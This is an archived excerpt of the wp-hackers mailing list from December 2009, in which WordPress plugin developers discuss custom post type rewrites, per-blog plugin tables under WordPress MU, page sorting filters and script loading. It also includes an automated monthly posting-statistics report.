From me at anthony.geek.nz  Tue Dec  1 01:15:12 2009
From: me at anthony.geek.nz (Anthony Cole)
Date: Tue, 1 Dec 2009 14:15:12 +1300
Subject: [wp-hackers] Custom Post Types
Message-ID: <C37C0C11-1740-435D-93F2-91A5E5F5FE5B@anthony.geek.nz>

Hey All,

I think I'm making this a bit hard on myself. I'm putting together a  
directory plugin and I'm kind of stuck at a certain point in making  
the rewrites work. Some of you are going to kill me when I type this  
because I *think* this is the completely wrong way to do things.

What I'm doing is using a shortcode and a mix of get_query_vars to  
load my custom post types into a url. If a certain query_var is  
present (have a few rewrite rules - IE one for categories) then it  
loads the content.

Obviously this is causing more harm then good and I'm just clueless of  
how to do it the right way. I've seen a few people allude to doing it  
on hackers, but would someone mind clarifying the *proper* way to do  
this?

Cheers,
Anthony

From derek at amphibian.info  Tue Dec  1 01:19:14 2009
From: derek at amphibian.info (Derek Hogue)
Date: Mon, 30 Nov 2009 17:19:14 -0800 (PST)
Subject: [wp-hackers] MU-compatbility with custom plugin tables?
In-Reply-To: <674b4a3b0911301406u7f4da17bsaf4fb498befa8c1a@mail.gmail.com>
References: <0a3aa8ae-b827-4de5-a222-f44d62b012f1@g27g2000yqn.googlegroups.com>
	<674b4a3b0911301406u7f4da17bsaf4fb498befa8c1a@mail.gmail.com>
Message-ID: <cdbdf648-9955-4c2d-a66c-ad610fa89baa@e31g2000vbm.googlegroups.com>

Thanks for that Austin, that's good to know - though, that's not
exactly what I was looking for.  I do need everyone using their own
tables, as they'll be posting their own list of shows.

So, current behavior in terms of inserting data is fine - it's looking
for the tables that I *want* to be there.  But since GigPress is
installed in 'mu-plugins', blog users never activate the plugin, so
their own set of tables never get installed.

I suppose I could do a quick 'SHOW tables LIKE' check on admin_init to
see if the tables are there, and if not, install them, but that seems
excessive.

Derek

On Nov 30, 6:06?pm, Austin Matzko <if.webs... at gmail.com> wrote:
> On Mon, Nov 30, 2009 at 4:02 PM, Derek Hogue <de... at amphibian.info> wrote:
> > Hey all - recently I've been asked by several users to look into full
> > MU-compatibility for my plugin GigPress. The problem is, GigPress uses
> > 4 custom database tables to hold its data.
>
> > So when it's installed, these tables are created with the current
> > database prefix (say, wp_'). ?But if the plugin is installed as a site-
> > wide plugin (in the 'mu-plugins' folder), when other users try to add
> > data, it doesn't fly (trying to insert into tables that don't exist,
> > like 'wp_2_gigpress_shows').
>
> > Does MU offer any sort of hook for site-wide-plugins to automatically
> > create these tables for each individual blog when it's created? Or are
> > plugins which use their own DB tables only compatible when put into
> > the 'plugins' folder in MU?
>
> WPMU has $wpdb->base_prefix, which would be "wp_" in your example, and
> the standard WordPress $wpdb->prefix, which changes depending on the
> current blog (changing to things like "wp_2_"). ?Check for and use
> $wpdb->base_prefix to set up site-wide tables.
> _______________________________________________
> wp-hackers mailing list
> wp-hack... at lists.automattic.comhttp://lists.automattic.com/mailman/listinfo/wp-hackers

From if.website at gmail.com  Tue Dec  1 01:28:58 2009
From: if.website at gmail.com (Austin Matzko)
Date: Mon, 30 Nov 2009 19:28:58 -0600
Subject: [wp-hackers] MU-compatbility with custom plugin tables?
In-Reply-To: <cdbdf648-9955-4c2d-a66c-ad610fa89baa@e31g2000vbm.googlegroups.com>
References: <0a3aa8ae-b827-4de5-a222-f44d62b012f1@g27g2000yqn.googlegroups.com>
	<674b4a3b0911301406u7f4da17bsaf4fb498befa8c1a@mail.gmail.com>
	<cdbdf648-9955-4c2d-a66c-ad610fa89baa@e31g2000vbm.googlegroups.com>
Message-ID: <674b4a3b0911301728n74192621pa2c3cce0aa24ff21@mail.gmail.com>

On Mon, Nov 30, 2009 at 7:19 PM, Derek Hogue <derek at amphibian.info> wrote:
> Thanks for that Austin, that's good to know - though, that's not
> exactly what I was looking for. ?I do need everyone using their own
> tables, as they'll be posting their own list of shows.
>
> So, current behavior in terms of inserting data is fine - it's looking
> for the tables that I *want* to be there. ?But since GigPress is
> installed in 'mu-plugins', blog users never activate the plugin, so
> their own set of tables never get installed.
>
> I suppose I could do a quick 'SHOW tables LIKE' check on admin_init to
> see if the tables are there, and if not, install them, but that seems
> excessive.

You might check for MU and disable functionality (with an admin
warning message for site admins) until the site admin runs a setup
script that creates all tables.  In that case it would be only a check
for a single option marking whether installation has completed.


From mikeschinkel at newclarity.net  Tue Dec  1 02:00:58 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 30 Nov 2009 21:00:58 -0500
Subject: [wp-hackers] This was painful to read...
In-Reply-To: <ca7320070911301325m16ae9eb2p2b7cdbb8e727cebe@mail.gmail.com>
References: <4DDFBF3D-6E70-4420-8DF0-15579CAAFC78@newclarity.net>
	<77b239a00911280421q5ff6ea94ja0243cc441bdf587@mail.gmail.com>
	<659E46A2-76B1-4894-9766-1C51BBEC414E@newclarity.net>
	<77b239a00911280527v2501fb92i2ef2de9d9657cbc1@mail.gmail.com>
	<81AC58EF-62EC-4203-B4F6-0D7E0B4C070A@newclarity.net>
	<349fe48b0911280609n6691d318mf6e519c0eb3b0c3b@mail.gmail.com>
	<7F9E570E-0FF2-47AB-9DED-F7462C99D19C@newclarity.net>
	<349fe48b0911280620t52092161iea9a4eac95831d66@mail.gmail.com>
	<31CE3F55-B12E-4B8F-8096-394E23D1B579@newclarity.net>
	<ca7320070911301325m16ae9eb2p2b7cdbb8e727cebe@mail.gmail.com>
Message-ID: <44031898-0C35-46B9-BBFB-670D9AD2D25A@newclarity.net>

On Nov 30, 2009, at 4:25 PM, Aaron Brazell wrote:
> In WP 2.9, register_post_type() adds a post type of foo.
> 
> Using WP_Rewrite::add_rewrite_tag() allows you to add a new custom permalink
> structure, say, /%foo%/
> 
> Add these things to a fuction hooked on init with a low priority and you
> should be good to go. I don't see the problem with a little ingenuity and a
> few lines of code.

Thanks.  I've stayed aware from non-released versions so I'll be anxious to try that when 2.9 is released. 

(Anyone have any idea when to expect 2.9?)

-Mike Schinkel

From glenn at glennansley.com  Tue Dec  1 02:08:28 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Mon, 30 Nov 2009 21:08:28 -0500
Subject: [wp-hackers] MU-compatbility with custom plugin tables?
In-Reply-To: <674b4a3b0911301728n74192621pa2c3cce0aa24ff21@mail.gmail.com>
References: <0a3aa8ae-b827-4de5-a222-f44d62b012f1@g27g2000yqn.googlegroups.com>
	<674b4a3b0911301406u7f4da17bsaf4fb498befa8c1a@mail.gmail.com>
	<cdbdf648-9955-4c2d-a66c-ad610fa89baa@e31g2000vbm.googlegroups.com>
	<674b4a3b0911301728n74192621pa2c3cce0aa24ff21@mail.gmail.com>
Message-ID: <7474be390911301808t10c614a8jee56f94e74c9ee30@mail.gmail.com>

I would create a flag for each blog (maybe the blog options table)
each time a blog used your plugin for the first time.
On first use, use dbdelta to create the table.

Glenn Ansley
http://fullthrottledevelopment.com
http://twitter.com/glennansley

On Mon, Nov 30, 2009 at 8:28 PM, Austin Matzko <if.website at gmail.com> wrote:
> On Mon, Nov 30, 2009 at 7:19 PM, Derek Hogue <derek at amphibian.info> wrote:
>> Thanks for that Austin, that's good to know - though, that's not
>> exactly what I was looking for. ?I do need everyone using their own
>> tables, as they'll be posting their own list of shows.
>>
>> So, current behavior in terms of inserting data is fine - it's looking
>> for the tables that I *want* to be there. ?But since GigPress is
>> installed in 'mu-plugins', blog users never activate the plugin, so
>> their own set of tables never get installed.
>>
>> I suppose I could do a quick 'SHOW tables LIKE' check on admin_init to
>> see if the tables are there, and if not, install them, but that seems
>> excessive.
>
> You might check for MU and disable functionality (with an admin
> warning message for site admins) until the site admin runs a setup
> script that creates all tables. ?In that case it would be only a check
> for a single option marking whether installation has completed.
>
> From that point forward you could trigger table creation whenever
> someone creates a new blog.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From glenn at glennansley.com  Tue Dec  1 02:18:58 2009
From: glenn at glennansley.com (Glenn Ansley)
Date: Mon, 30 Nov 2009 21:18:58 -0500
Subject: [wp-hackers] Custom page orders in edit pages menu?
In-Reply-To: <05A9CD6C-A675-4756-A6F7-44339802B586@emrl.com>
References: <05A9CD6C-A675-4756-A6F7-44339802B586@emrl.com>
Message-ID: <7474be390911301818r234316efp6cc88625153ab295@mail.gmail.com>

I didn't look at the code too extensively so there may be other places
to look as well, but the following (on line 32) means that it's only
firing off on the Edit Post screen (the screen that lists all the
posts).

if( $query->is_admin && ( 'edit.php' == $pagenow ) ) { ... }

You would need to make sure its checking for edit-pages.php as well.
And on a side note, is_admin() would probably be a cleaner solution
that $query->is_admin

Glenn Ansley
http://fullthrottledevelopment.com
http://twitter.com/glennansley

On Mon, Nov 30, 2009 at 6:27 PM, Matthew Gerring <mgerring at emrl.com> wrote:
> I've got kind of a sticky situation- I'm working on a site that has a bunch
> of custom taxonomies and metadata for pages (biographies, in this case) and
> my client wants to be able to sort the posts by the custom taxonomies or by
> custom fields in the backend. I found some code that will allow you to do
> that on the Edit Posts page, but not the Edit Pages page.
>
> Here's the code: http://wordpress.pastebin.com/m24f51530
>
> What changes would need to be made to allow this to work in the Pages edit
> screen? I looked for a pre_get_pages hook, but there apparently isn't one.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From batmoo at gmail.com  Tue Dec  1 05:49:31 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Tue, 1 Dec 2009 00:49:31 -0500
Subject: [wp-hackers] Custom page orders in edit pages menu?
In-Reply-To: <7474be390911301818r234316efp6cc88625153ab295@mail.gmail.com>
References: <05A9CD6C-A675-4756-A6F7-44339802B586@emrl.com> 
	<7474be390911301818r234316efp6cc88625153ab295@mail.gmail.com>
Message-ID: <eaaa36c90911302149n4cd0d7c6q89821291f9f8db9f@mail.gmail.com>

>
> > What changes would need to be made to allow this to work in the Pages
> edit screen? I looked for a pre_get_pages hook, but there apparently isn't
> one.


Looks like you could use the manage_pages_query filter.

Called in edit-pages.php as follows:
$query = apply_filters('manage_pages_query', $query);

Hook into that the same way pre_get_posts does in the code sample you
included and that should work.

Though, should note, Glenn's solution would work as well.
--
Mohammad Jangda
www.digitalize.ca | @mjangda

From r at schestowitz.com  Tue Dec  1 09:47:37 2009
From: r at schestowitz.com (Roy Schestowitz)
Date: Tue, 01 Dec 2009 09:47:37 +0000
Subject: [wp-hackers] WP-Hackers Stats for December 2009
Message-ID: <4B14E639.9040702@schestowitz.com>

  ?  Times are Greenwich Mean Time (GMT) +0:00

  ?  Statistics span a period of one month

  ?  Subject line formatted consistently "WP-Hackers Stats for <MONTH>
<YEAR>"

  ?  Killfile <subject contains "WP-Hackers Stats for "> if uninterested
____________________________________________________________

Stats for wp-hackers
~~~~~~~~~~~~~~~~~~~~
***** People who have written most messages:
+----+-----Author-----------------------------------+--Msg-+-Percent-+
|  1 | scribu gmail.com                             |   54 |  9.89 % |
|  2 | otto ottodestruct.com                        |   45 |  8.24 % |
|  3 | mikeschinkel newclarity.net                  |   30 |  5.49 % |
|  4 | wp xentek.net                                |   22 |  4.03 % |
|  5 | Ken adcSTUDIO.com                            |   17 |  3.11 % |
|  6 | william.canino googlemail.com                |   15 |  2.75 % |
|  7 | wordpress dd32.id.au                         |   15 |  2.75 % |
|  8 | wordpress santosj.name                       |   14 |  2.56 % |
|  9 | peter.westwood ftwr.co.uk                    |   12 |  2.20 % |
| 10 | kkarpieszuk gmail.com                        |   12 |  2.20 % |
| 11 | jer simianuprising.com                       |   12 |  2.20 % |
| 12 | dave technicacreative.co.uk                  |   10 |  1.83 % |
| 13 | pete jointforcestech.com                     |   10 |  1.83 % |
| 14 | steve sltaylor.co.uk                         |    9 |  1.65 % |
| 15 | mark watero.us                               |    9 |  1.65 % |
| 16 | anacin gwhatchet.com                         |    9 |  1.65 % |
| 17 | matt mattjacob.com                           |    8 |  1.47 % |
| 18 | wp-hackers striderweb.com                    |    8 |  1.47 % |
| 19 | tunamaxx yahoo.com                           |    7 |  1.28 % |
| 20 | photofantaisie gmail.com                     |    7 |  1.28 % |
| 21 | autremonde75 gmail.com                       |    6 |  1.10 % |
| 22 | cclarkson htcomp.net                         |    6 |  1.10 % |
| 23 | gaarai gaarai.com                            |    6 |  1.10 % |
| 24 | lynne.pope gmail.com                         |    5 |  0.92 % |
| 25 | glenn glennansley.com                        |    5 |  0.92 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  193 | 35.35 % |
+----+----------------------------------------------+------+---------+

***** Best authors, by total size of their messages (w/o quoting):
+----+-----Author-------------------------------------------+-KBytes-+
|  1 | otto ottodestruct.com                                |   45.5 |
|  2 | mikeschinkel newclarity.net                          |   39.6 |
|  3 | wordpress santosj.name                               |   32.4 |
|  4 | scribu gmail.com                                     |   28.0 |
|  5 | mccormicky gmail.com                                 |   13.9 |
|  6 | wordpress dd32.id.au                                 |   13.4 |
|  7 | wp xentek.net                                        |   12.5 |
|  8 | kkarpieszuk gmail.com                                |   11.7 |
|  9 | william.canino googlemail.com                        |   11.4 |
| 10 | golunski onet.eu                                     |   11.2 |
| 11 | cclarkson htcomp.net                                 |   10.5 |
| 12 | jer simianuprising.com                               |    9.7 |
| 13 | Ken adcSTUDIO.com                                    |    9.6 |
| 14 | mark watero.us                                       |    9.3 |
| 15 | steve sltaylor.co.uk                                 |    8.2 |
| 16 | contato catiakitahara.com.br                         |    7.7 |
| 17 | peter.westwood ftwr.co.uk                            |    7.7 |
| 18 | tunamaxx yahoo.com                                   |    6.7 |
| 19 | russgilbert gmail.com                                |    6.0 |
| 20 | wp-hackers striderweb.com                            |    5.9 |
| 21 | matt mattjacob.com                                   |    5.5 |
| 22 | gaarai gaarai.com                                    |    5.3 |
| 23 | beau dentedreality.com.au                            |    5.0 |
| 24 | autremonde75 gmail.com                               |    4.4 |
| 25 | photofantaisie gmail.com                             |    4.4 |
+----+------------------------------------------------------+--------+

***** Best authors, by average size of their message (w/o quoting):
+----+-----Author--------------------------------------------+-bytes-+
|  1 | golunski onet.eu                                      | 11464 |
|  2 | mccormicky gmail.com                                  |  4753 |
|  3 | contato catiakitahara.com.br                          |  2644 |
|  4 | wordpress santosj.name                                |  2371 |
|  5 | markjaquith gmail.com                                 |  2332 |
|  6 | jason realestatetomato.com                            |  2174 |
|  7 | liste srpski.biz                                      |  1918 |
|  8 | cclarkson htcomp.net                                  |  1789 |
|  9 | beau dentedreality.com.au                             |  1717 |
| 10 | raven mecus.es                                        |  1708 |
| 11 | shane bugssite.org                                    |  1555 |
| 12 | patrik.bona mrhead.sk                                 |  1510 |
| 13 | john aldenta.com                                      |  1476 |
| 14 | mrbrog gmail.com                                      |  1453 |
| 15 | xrdawson gmail.com                                    |  1382 |
| 16 | burobjorn gmail.com                                   |  1378 |
| 17 | mikeschinkel newclarity.net                           |  1352 |
| 18 | russgilbert gmail.com                                 |  1234 |
| 19 | erisds gmail.com                                      |  1234 |
| 20 | hn sacharis.no                                        |  1207 |
| 21 | celeph gmail.com                                      |  1155 |
| 22 | cdunde1 tampabay.rr.com                               |  1127 |
| 23 | malaiac gmail.com                                     |  1095 |
| 24 | jordi jcanals.cat                                     |  1077 |
| 25 | mark watero.us                                        |  1053 |
+----+-------------------------------------------------------+-------+

***** Table showing the most successful subjects:
+----+----Subject-----------------------------------+--Msg-+-Percent-+
|  1 | [wp-hackers] WordPress <= 2.8.5 Unrestricted |   35 |  6.41 % |
|  2 | [wp-hackers] Options for Controller - Views  |   27 |  4.95 % |
|  3 | [wp-hackers] "deprecating" direct calls to w |   24 |  4.40 % |
|  4 | [wp-hackers] Username Madness                |   21 |  3.85 % |
|  5 | [wp-hackers] Not willing to summon the ancie |   19 |  3.48 % |
|  6 | [wp-hackers] This was painful to read...     |   19 |  3.48 % |
|  7 | [wp-hackers] Plugins and themes localization |   18 |  3.30 % |
|  8 | [wp-hackers] plugin compatability            |   16 |  2.93 % |
|  9 | [wp-hackers] Best practice way for a plugin  |   16 |  2.93 % |
| 10 | [wp-hackers] some problem with javascript in |   14 |  2.56 % |
| 11 | [wp-hackers] Sidebar ID Naming Problems      |   14 |  2.56 % |
| 12 | [wp-hackers] The problem with WP_Rewrite <<< |   14 |  2.56 % |
| 13 | [wp-hackers] Delete Plugin on SVN please     |   13 |  2.38 % |
| 14 | [wp-hackers] Feed caching                    |   13 |  2.38 % |
| 15 | [wp-hackers] A Humble Request                |   12 |  2.20 % |
| 16 | [wp-hackers] Putting post into /blog/        |   11 |  2.01 % |
| 17 | [wp-hackers] Handling cookies with wp-plugin |   10 |  1.83 % |
| 18 | [wp-hackers] WordPress <= 2.8.5 Unrestricted |   10 |  1.83 % |
| 19 | [wp-hackers] SEO,                            |   10 |  1.83 % |
| 20 | [wp-hackers] Adding an output buffer callbac |    9 |  1.65 % |
| 21 | [wp-hackers] no 'before' or 'after' paramete |    9 |  1.65 % |
| 22 | [wp-hackers] custom Edit Pages screens       |    8 |  1.47 % |
| 23 | [wp-hackers] How to number the paged comment |    8 |  1.47 % |
| 24 | [wp-hackers] WP as a CMS with a touch of Blo |    8 |  1.47 % |
| 25 | [wp-hackers] Uploading image attachments fro |    7 |  1.28 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  181 | 33.15 % |
+----+----------------------------------------------+------+---------+

***** Most used email clients:
+----+----Mailer------------------------------------+--Msg-+-Percent-+
|  1 | Google Mail/Other                            |  311 | 56.96 % |
|  2 | Apple Mail (2.936)                           |   40 |  7.33 % |
|  3 | Apple Mail (2.1077)                          |   33 |  6.04 % |
|  4 | Thunderbird 2.0.0.23 (Windows/20090812)      |   30 |  5.49 % |
|  5 | Apple Mail (2.1076)                          |   21 |  3.85 % |
|  6 | Mozilla/5.x                                  |   21 |  3.85 % |
|  7 | Microsoft Office Outlook 12.0                |   14 |  2.56 % |
|  8 | Thunderbird 2.0.0.23 (X11/20090817)          |   12 |  2.20 % |
|  9 | Opera Mail/10.10 (Win32)                     |    9 |  1.65 % |
| 10 | G2/1.0                                       |    7 |  1.28 % |
| 11 | YahooMailClassic/8.1.6 YahooMailWebService/0 |    5 |  0.92 % |
| 12 | Opera Mail/10.20 (Win32)                     |    5 |  0.92 % |
| 13 | Evolution 2.26.1                             |    4 |  0.73 % |
| 14 | Apple Mail (2.935.3)                         |    4 |  0.73 % |
| 15 | Opera Mail/10.01 (Win32)                     |    3 |  0.55 % |
| 16 | Evolution 2.28.1                             |    3 |  0.55 % |
| 17 | Microsoft Outlook Express 6.x                |    3 |  0.55 % |
| 18 | Industrious bit-pushing elves                |    3 |  0.55 % |
| 19 | Lotus Notes Release 7.0                      |    2 |  0.37 % |
| 20 | Evolution 2.22.3.1                           |    2 |  0.37 % |
| 21 | iPhone Mail (7D11)                           |    2 |  0.37 % |
| 22 | YahooMailClassic/8.1.6 YahooMailWebService/0 |    2 |  0.37 % |
| 23 | Microsoft Outlook IMO                        |    2 |  0.37 % |
| 24 | Forte Agent 5.0x                             |    2 |  0.37 % |
| 25 | Thunderbird 2.0.0.23 (Macintosh/20090812)    |    2 |  0.37 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |    4 |  0.73 % |
+----+----------------------------------------------+------+---------+

***** Table of maximal quoting:
+----+-----Author------------------------------------------+-Percent-+
|  1 | donncha linux.ie                                    | 86.44 % |
|  2 | feeds armeda.com                                    | 84.34 % |
|  3 | trelvao workmedia.pt                                | 83.66 % |
|  4 | marvinc gmail.com                                   | 83.38 % |
|  5 | pete jointforcestech.com                            | 78.55 % |
|  6 | celeph gmail.com                                    | 76.14 % |
|  7 | dave technicacreative.co.uk                         | 74.68 % |
|  8 | shinji elite-systems.org                            | 74.32 % |
|  9 | ceo kettlewell.net                                  | 73.18 % |
| 10 | bryanharley gmail.com                               | 71.91 % |
| 11 | spencer.gurnk gmail.com                             | 70.00 % |
| 12 | leogermani gmail.com                                | 69.65 % |
| 13 | kontakt joernroeder.de                              | 69.06 % |
| 14 | lew fullthrottledevelopment.com                     | 66.15 % |
| 15 | joost yoast.com                                     | 65.28 % |
| 16 | navjotjsingh gmail.com                              | 64.49 % |
| 17 | dan phiffer.org                                     | 64.40 % |
| 18 | mgerring emrl.com                                   | 61.80 % |
| 19 | office wpseek.com                                   | 60.72 % |
| 20 | gaarai gaarai.com                                   | 58.57 % |
| 21 | SuperMoonMan gmail.com                              | 57.93 % |
| 22 | johnbillion+wp gmail.com                            | 54.45 % |
| 23 | tim silentgap.com                                   | 53.55 % |
| 24 | ryan boren.nu                                       | 53.30 % |
| 25 | markandrewslade gmail.com                           | 52.65 % |
+----+-----------------------------------------------------+---------+
|    | average                                             | 42.52 % |
+----+-----------------------------------------------------+---------+

***** Graph showing number of messages written during hours of day:

100% ---------------------------#--------------------- - 44
 90% -----------------------#---#-----#-#------------- msgs
 80% -----------------------#---#-#---#-#-------------
 70% ---------------------#-#-#-#-#-#-#-#-------------
 60% -------------------#-#-#-#-#-#-#-#-#-----#-------
 50% -----------------#-#-#-#-#-#-#-#-#-#-#---#-#-----
 40% -#-#-------------#-#-#-#-#-#-#-#-#-#-#-#-#-#-----
 30% -#-#-------------#-#-#-#-#-#-#-#-#-#-#-#-#-#---#-
 20% -#-#-#---------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 10% -#-#-#---#-----#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
      * * * * * * * * * * * * * * * * * * * * * * * *
hour  0         5           11          17          23


***** Graph showing number of messages written during days of month:

100% ---------------------#----------------------------------------- - 39
 90% -----#---------------#-#---------------#----------------------- msgs
 80% -----#---#-----------#-#-------------#-#---------------#-------
 70% -----#---#-----------#-#-----------#-#-#---------------#-------
 60% -----#---#-----------#-#---------#-#-#-#---------------#---#---
 50% -----#-#-#-----------#-#-------#-#-#-#-#---------------#---#---
 40% -#-#-#-#-#-----------#-#-#-----#-#-#-#-#-------------#-#-#-#---
 30% -#-#-#-#-#---------#-#-#-#-----#-#-#-#-#-------------#-#-#-#---
 20% -#-#-#-#-#-----#-#-#-#-#-#-----#-#-#-#-#-#-#-#-----#-#-#-#-#---
 10% -#-#-#-#-#-#---#-#-#-#-#-#-#---#-#-#-#-#-#-#-#-#-#-#-#-#-#-#---
      * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 day  1         6           12          18          24            31


***** Graph showing number of messages written during days of week:

100% -------------#--------------- - 111
 90% -------------#--------------- msgs
 80% ---------#---#---------------
 70% -#---#---#---#---------------
 60% -#---#---#---#---#-----------
 50% -#---#---#---#---#-----------
 40% -#---#---#---#---#---#---#---
 30% -#---#---#---#---#---#---#---
 20% -#---#---#---#---#---#---#---
 10% -#---#---#---#---#---#---#---
      *   *   *   *   *   *   *
     Mon Tue Wed Thu Fri Sat Sun


***** Maximal quoting:
      Author     : pete jointforcestech.com
      Subject    : [wp-hackers] WordPress <= 2.8.5 Unrestricted File Upload
      Date       : Thu, 12 Nov 2009 13:30:11 -0800
      Quote ratio: 94.90% / 5486 bytes

***** Longest message:
      Author     : golunski onet.eu
      Subject    : [wp-hackers] WordPress <= 2.8.5 Unrestricted File
Upload Arbitrary
      Date       : Wed, 11 Nov 2009 17:08:04 +0000
      Size       : 11507 bytes

***** Most successful subject:
      Subject    : [wp-hackers] WordPress <= 2.8.5 Unrestricted File Upload
      No. of msgs: 35
      Total size : 66709 bytes

***** Final summary:
      Total number of messages:             546
      Total number of different authors:    116
      Total number of different subjects:   86
      Total size of messages (w/o headers): 838979 bytes
      Average size of a message:            1536 bytes

***** Generated by MailListStat v1.3, (C) 2001-2003 <marki (at) nexin.sk>
***** See http://freshmeat.net/projects/mls for details...

DISCLAIMER: Stats automatically produced. Remember that stats are often
meaningless and deceiving.

From derek at amphibian.info  Tue Dec  1 14:48:11 2009
From: derek at amphibian.info (Derek Hogue)
Date: Tue, 1 Dec 2009 06:48:11 -0800 (PST)
Subject: [wp-hackers] MU-compatbility with custom plugin tables?
In-Reply-To: <7474be390911301808t10c614a8jee56f94e74c9ee30@mail.gmail.com>
References: <0a3aa8ae-b827-4de5-a222-f44d62b012f1@g27g2000yqn.googlegroups.com>
	<674b4a3b0911301406u7f4da17bsaf4fb498befa8c1a@mail.gmail.com> 
	<cdbdf648-9955-4c2d-a66c-ad610fa89baa@e31g2000vbm.googlegroups.com> 
	<674b4a3b0911301728n74192621pa2c3cce0aa24ff21@mail.gmail.com> 
	<7474be390911301808t10c614a8jee56f94e74c9ee30@mail.gmail.com>
Message-ID: <c2d4f29e-54ee-4b99-8283-0e5ff4de68d8@f20g2000vbl.googlegroups.com>

Thanks for the idea guys, that should do me.  Glenn's suggestion seems
the quickest and simplest.

Best,
Derek

On Nov 30, 10:08?pm, Glenn Ansley <gl... at glennansley.com> wrote:
> I would create a flag for each blog (maybe the blog options table)
> each time a blog used your plugin for the first time.
> On first use, use dbdelta to create the table.
>
> Glenn Ansleyhttp://fullthrottledevelopment.comhttp://twitter.com/glennansley
>
>
>
>
>
> On Mon, Nov 30, 2009 at 8:28 PM, Austin Matzko <if.webs... at gmail.com> wrote:
> > On Mon, Nov 30, 2009 at 7:19 PM, Derek Hogue <de... at amphibian.info> wrote:
> >> Thanks for that Austin, that's good to know - though, that's not
> >> exactly what I was looking for. ?I do need everyone using their own
> >> tables, as they'll be posting their own list of shows.
>
> >> So, current behavior in terms of inserting data is fine - it's looking
> >> for the tables that I *want* to be there. ?But since GigPress is
> >> installed in 'mu-plugins', blog users never activate the plugin, so
> >> their own set of tables never get installed.
>
> >> I suppose I could do a quick 'SHOW tables LIKE' check on admin_init to
> >> see if the tables are there, and if not, install them, but that seems
> >> excessive.
>
> > You might check for MU and disable functionality (with an admin
> > warning message for site admins) until the site admin runs a setup
> > script that creates all tables. ?In that case it would be only a check
> > for a single option marking whether installation has completed.
>
> > From that point forward you could trigger table creation whenever
> > someone creates a new blog.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hack... at lists.automattic.com
> >http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hack... at lists.automattic.comhttp://lists.automattic.com/mailman/listinfo/wp-hackers

From office at wpseek.com  Tue Dec  1 18:40:46 2009
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Tue, 01 Dec 2009 19:40:46 +0100
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php "queue"?
Message-ID: <4B15632E.2070002@wpseek.com>

Hey,

I was just curious. Is it possible to hook into load-styles.php / 
load-scripts.php to load a custom CSS/JS file the same way WP loads the 
files in wp-admin? Would be nice to get your own plugin javascript files 
loaded minified/merged in load-scripts.php.

Any thoughts?

Regards,
Oliver


-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/


From anacin at gwhatchet.com  Tue Dec  1 19:28:27 2009
From: anacin at gwhatchet.com (Andrew Nacin)
Date: Tue, 1 Dec 2009 14:28:27 -0500
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <4B15632E.2070002@wpseek.com>
References: <4B15632E.2070002@wpseek.com>
Message-ID: <8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>

>
> I was just curious. Is it possible to hook into load-styles.php /
> load-scripts.php to load a custom CSS/JS file the same way WP loads the
> files in wp-admin? Would be nice to get your own plugin javascript files
> loaded minified/merged in load-scripts.php.


http://codex.wordpress.org/Function_Reference/wp_enqueue_script
<http://codex.wordpress.org/Function_Reference/wp_enqueue_script>
http://codex.wordpress.org/Function_Reference/wp_enqueue_styles

From yok2504 at gmail.com  Tue Dec  1 19:31:54 2009
From: yok2504 at gmail.com (Sinan)
Date: Tue, 1 Dec 2009 21:31:54 +0200
Subject: [wp-hackers] Hook into load-styles.php / load-scripts.php
	"queue"?
In-Reply-To: <8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
Message-ID: <64aa440d0912011131w48213d5bmf685e7dfbe9ddfaa@mail.gmail.com>

are you find this ?
http://www.oyuncakblog.net/

<http://www.oyuncakblog.net/>js+css change see the example
http://www.ecst.csuchico.edu/~bertucci/csci245/styleswitcher.htm

<http://www.ecst.csuchico.edu/~bertucci/csci245/styleswitcher.htm>

2009/12/1 Andrew Nacin <anacin at gwhatchet.com>

> >
> > I was just curious. Is it possible to hook into load-styles.php /
> > load-scripts.php to load a custom CSS/JS file the same way WP loads the
> > files in wp-admin? Would be nice to get your own plugin javascript files
> > loaded minified/merged in load-scripts.php.
>
>
> http://codex.wordpress.org/Function_Reference/wp_enqueue_script
> <http://codex.wordpress.org/Function_Reference/wp_enqueue_script>
> http://codex.wordpress.org/Function_Reference/wp_enqueue_styles
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
    Sinan ??LER
www.sinanisler.com

From office at wpseek.com  Tue Dec  1 19:35:13 2009
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Tue, 01 Dec 2009 20:35:13 +0100
Subject: [wp-hackers] Hook into load-styles.php /
	load-scripts.php	"queue"?
In-Reply-To: <8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
References: <4B15632E.2070002@wpseek.com>
	<8b870c460912011128l213c6d74id919101ec3dcc5c7@mail.gmail.com>
Message-ID: <4B156FF1.2020200@wpseek.com>

Thanks Andrew.

But these functions are the common way to include custom JS and CSS 
files in the <head> area. They add extra

<script....
or
<link...

file references to the head area. What I'm trying to do is to avoid 
these extra <script.... and <link... references and get my files loaded 
with the load-styles.php / load-scripts.php files.

Regards


On 01.12.2009 20:28, Andrew Nacin wrote:
